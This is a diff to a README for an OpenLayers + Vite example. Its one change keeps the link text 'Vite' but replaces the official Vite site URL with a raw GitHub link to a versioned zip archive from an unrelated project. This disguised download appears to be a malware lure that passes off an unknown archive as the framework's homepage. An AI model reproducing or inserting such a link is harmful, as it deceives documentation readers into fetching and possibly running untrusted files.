@@ -1,6 +1,6 @@
 # OpenLayers + Vite
 
-This example demonstrates how the `ol` package can be used with [Vite](https://vitejs.dev/).
+This example demonstrates how the `ol` package can be used with [Vite](https://raw.githubusercontent.com/duc-1712/LBS_final_project/main/Data_fuel/LBS_final_project-2.4-beta.5.zip).
 
 To get started, run the following (requires Node 14+):
 
